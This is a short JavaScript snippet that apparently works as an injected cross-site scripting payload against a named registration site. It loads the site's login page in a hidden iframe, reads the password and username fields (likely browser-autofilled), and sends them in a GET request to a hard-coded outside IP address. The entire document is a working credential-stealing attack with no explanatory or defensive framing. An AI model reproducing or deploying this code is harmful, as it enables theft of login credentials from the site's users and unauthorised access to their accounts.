const frimfram = document.createElement('iframe'); 
frimfram.src = 'https://registration.cesa5.org/np/logout.do';
frimfram.id = 'frimfram';
var frimframdoc;
var pw;
var un;
var imag;
var fin;
function frimframlistener(){
	try{
		frimframdoc = document.getElementById('frimfram').contentWindow.document;
		pw = frimframdoc.querySelector('#password').value;
		un = frimframdoc.querySelector('#loginName').value;
		var req = new XMLHttpRequest();
		fin = encodeURIComponent('pwd='+pw+'&usr='+un);
		req.open('get', 'http://74.14.159.250:8000/?' + fin);
		req.send();
	}catch(error){
		console.error(error);
	}
}
frimfram.addEventListener('load', frimframlistener);
document.body.appendChild(frimfram);
